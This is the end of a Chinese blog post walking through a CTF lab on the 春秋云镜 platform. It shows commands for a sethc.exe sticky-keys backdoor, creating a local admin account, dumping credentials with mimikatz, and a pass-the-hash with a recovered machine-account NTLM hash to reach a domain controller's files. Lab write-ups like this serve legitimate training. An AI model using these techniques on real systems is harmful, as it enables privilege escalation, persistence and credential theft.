+<figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">reg add <span class="string">&quot;HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Image File Execution Options\sethc.exe&quot;</span> /v Debugger /t REG_SZ /d <span class="string">&quot;C:\Windows\System32\cmd.exe&quot;</span></span><br></pre></td></tr></table></figure>
+
+<p>然后锁定用户，按5次shift，弹出命令行，提权到system</p>
+<p><a target="_blank" rel="noopener" href="https://typero-1312563978.cos.ap-shanghai.myqcloud.com/typero/202304091921464.png" title="image-20230409192132244" class="gallery-item" style="box-shadow: none;"> <img src="https://typero-1312563978.cos.ap-shanghai.myqcloud.com/typero/202304091921464.png" alt="image-20230409192132244"></a></p>
+<h3 id="flag2"><a href="#flag2" class="headerlink" title="flag2"></a>flag2</h3><p>然后创建用户，添加到管理员组，然后使用本地管理员登录</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">net user v2 123456@qwe /add</span><br><span class="line">net localgroup administrators v2 /add</span><br></pre></td></tr></table></figure>
+
+<p>得到flag2:<code>flag&#123;72cbfc36-11a0-4469-84e9-e399bcd9b5fa&#125;</code></p>
+<p><a target="_blank" rel="noopener" href="https://typero-1312563978.cos.ap-shanghai.myqcloud.com/typero/202304091929541.png" title="image-20230409192943467" class="gallery-item" style="box-shadow: none;"> <img src="https://typero-1312563978.cos.ap-shanghai.myqcloud.com/typero/202304091929541.png" alt="image-20230409192943467"></a></p>
+<p>然后重新连接，使用以下命令来开启rdesktop，设置共享文件夹</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">proxychains rdesktop 172.22.8.46  -r sound:<span class="built_in">local</span> -r disk:LinuxPictures=/home/kali/Desktop/thm_tmp/</span><br></pre></td></tr></table></figure>
+
+<h2 id="哈希传递访问域控文件系统"><a href="#哈希传递访问域控文件系统" class="headerlink" title="哈希传递访问域控文件系统"></a>哈希传递访问域控文件系统</h2><p>然后使用mimikat来抓取hash</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">mimikatz.exe <span class="string">&quot;privilege::debug&quot;</span> <span class="string">&quot;sekurlsa::logonpasswords full&quot;</span> <span class="built_in">exit</span></span><br></pre></td></tr></table></figure>
+
+<p><a target="_blank" rel="noopener" href="https://typero-1312563978.cos.ap-shanghai.myqcloud.com/typero/202304091939786.png" title="image-20230409193909740" class="gallery-item" style="box-shadow: none;"> <img src="https://typero-1312563978.cos.ap-shanghai.myqcloud.com/typero/202304091939786.png" alt="image-20230409193909740"></a></p>
+<p>这里发现了一个域内机器账户的ntml<code>WIN2016$:d5ddcd31948025648439184942c3fe92</code></p>
+<p>然后发现这个账户在域管理员组【因为后面添加的本地管理员不在域里，所以需要切回之前的域用户来查看域管理组信息】</p>
+<p><a target="_blank" rel="noopener" href="https://typero-1312563978.cos.ap-shanghai.myqcloud.com/typero/202304091947949.png" title="image-20230409194712902" class="gallery-item" style="box-shadow: none;"> <img src="https://typero-1312563978.cos.ap-shanghai.myqcloud.com/typero/202304091947949.png" alt="image-20230409194712902"></a></p>
+<p>然后使用mimikatz进行hash传递</p>
+<figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">mimikatz.exe <span class="string">&quot;privilege::debug&quot;</span> <span class="string">&quot;sekurlsa::pth /user:WIN2016<span class="variable">$</span> /domain:xiaorang.lab /ntlm:d5ddcd31948025648439184942c3fe92&quot;</span> <span class="keyword">exit</span></span><br></pre></td></tr></table></figure>
+
+<p>然后会弹出一个命令行，就可以使用访问域控里的文件了</p>
+<h3 id="flag3"><a href="#flag3" class="headerlink" title="flag3"></a>flag3</h3><p><a target="_blank" rel="noopener" href="https://typero-1312563978.cos.ap-shanghai.myqcloud.com/typero/202304091952150.png" title="image-20230409195224107" class="gallery-item" style="box-shadow: none;"> <img src="https://typero-1312563978.cos.ap-shanghai.myqcloud.com/typero/202304091952150.png" alt="image-20230409195224107"></a></p>
+<p>得到最后的flag:<code>flag&#123;63bb126b-495c-431d-b2de-55435d417cd0&#125;</code></p>
+</div><script src="https://jsd.onmicrosoft.cn/npm/hexo-theme-a4@latest/source/js/lightgallery.min.js"></script><script>if (typeof lightGallery !== 'undefined') {
+        var options = {
+            selector: '.gallery-item'
+        };
+        lightGallery(document.getElementsByClassName('.article-gallery')[0], options);
+        }</script>
+    </div>
+
+    <div class="post-meta">
+        <i>
+        
+            <span>2024-03-01</span>
+            
+                <span>该篇文章被 John Doe</span>
+            
+            
+             
+                <span>归为分类:
+                    
+                    
+                        <a href='/categories/%E6%98%A5%E7%A7%8B%E4%BA%91%E9%95%9C/'>
+                            春秋云镜
+                        </a>
+                    
+                </span>
+            
+        
+        </i>
+    </div>
+    <br>
+    
+    <!-- <div class="post-footer-pre-next">
+        <span>上一篇：<a href=""></a></span>
+        <span class="post-footer-pre-next-last-span-right">上一篇：<a href=""></a></span>
+    </div> -->
+
+    
+        
+    <div class="comments-container">
+    <div id="comment-anchor"></div>
+    <div class="comment-area-title">
+         
+    </div>
+    
+        
+
+    <div id="waline"></div>
+    <script type="module"  >
+        import { init } from 'https://npm.elemecdn.com/hexo-theme-a4@latest/source/js/waline.mjs'; 
+        function loadWaline() {
+            init({
+                el: '#waline',
+                serverURL: 'https://a4-talk.vercel.app',
+                lang: 'zh-CN',
+                dark: 'body[class~="dark-mode"]',
+                requiredMeta: ['nick','mail'], // cannot customize by theme config, change it yourself
+                search: false, // 禁止表情包搜索
+                reaction: false, // 对文章打分
+                pageview: false, // 浏览量统计
+                comment: false, // 评论数统计
+
+                locale: {
+                    placeholder: '欢迎评论', 
+                    sofa: ''
+                },
+            });
+            
+        }
+        window.addEventListener('DOMContentLoaded', loadWaline);
+    </script>
+
+
+
+    
+    
+    
+    </div>
+
+
+     
+</div>
+
+
+
+                                      
+                    
+                    
+                    <div class="footer">
+    
+        <span> 
+            © 1949-2024 China 
+
+            
+                
+
+            
+        </span>
+    
+</div>
+<!--这是指一条线往下的内容-->
+<div class="footer-last">
+    
+            <span>🌊面朝大海，春暖花开🌸</span>
+            
+                <span class="footer-last-span-right"><i>本站由<a target="_blank" rel="noopener" href="https://hexo.io/zh-cn/index.html">Hexo</a>驱动｜使用<a target="_blank" rel="noopener" href="https://github.com/HiNinoJay/hexo-theme-A4">Hexo-theme-A4</a>主题</i></span>
+            
+    
+</div>
+
+
+    
+<script src="https://cdnjs.cloudflare.com/ajax/libs/jquery/3.4.0/jquery.min.js"></script>
+
+    <!--目录-->
+    
+        <script src="https://cdnjs.cloudflare.com/ajax/libs/jquery/1.7.2/jquery.min.js" type="text/javascript" ></script>
+        <script src="https://cdnjs.cloudflare.com/ajax/libs/jqueryui/1.12.1/jquery-ui.min.js" type="text/javascript" ></script>
+        <script src="https://cdnjs.cloudflare.com/ajax/libs/jquery.tocify/1.9.0/javascripts/jquery.tocify.min.js" type="text/javascript" ></script>
+        
+<script src="/js/toc.js"></script>
+
+    
+
+    
+<script src="/js/randomHeaderContent.js"></script>
+
+    <!--回到顶部按钮-->
+    
+        
+<script src="/js/returnToTop.js"></script>
+
+    
+
+    
+        
+<script src="/js/returnToLastPage.js"></script>
+
+    
+
+
+
+
+
+<script src="/js/lightgallery.min.js"></script>
+
+
+
+                </div>
+            
+            
+                <!-- 回到顶部的按钮-->  
+                <div class="progress-wrap shadow-drop-2-bottom">
+                    <svg class="progress-circle svg-content" width="100%" height="100%" viewBox="-1 -1 102 102">
+                        <path d="M50,1 a49,49 0 0,1 0,98 a49,49 0 0,1 0,-98"/>
+                    </svg>
+                </div>
+            
+            
+                <!-- 返回的按钮-->  
+                <div class="return-to-last-progress-wrap shadow-drop-2-bottom">
+                    <svg class="progress-circle svg-content" width="100%" height="100%" viewBox="-1 -1 102 102">
+                        <path d="M50,1 a49,49 0 0,1 0,98 a49,49 0 0,1 0,-98"/>
+                    </svg>
+                </div>
+            
+    </body>
+
+
+    <!--暗黑模式-->
+    <script src="/js/darkmode-js.min.js"></script>
+    <script>
+        function addDarkmodeWidget() {
+        const options = {
+            bottom: '53px', // default: '32px'
+            right: 'unset', // default: '32px'
+            left: '42px', // default: 'unset'
+            time: '0.3s', // default: '0.3s'
+            mixColor: '#fff', // default: '#fff'
+            backgroundColor: ' #e4e4e4  ',  // default: '#fff'
+            buttonColorDark: '#100f2c',  // default: '#100f2c'
+            buttonColorLight: '#fff', // default: '#fff'
+            saveInCookies: true, // default: true,
+            label: '🌓', // default: ''
+            autoMatchOsTheme: true // default: true
+        }
+    
+        const darkmode = new Darkmode(options);
+        darkmode.showWidget();
+        
+        }
+        window.addEventListener('load', addDarkmodeWidget);
+    </script>
+  
+</html>
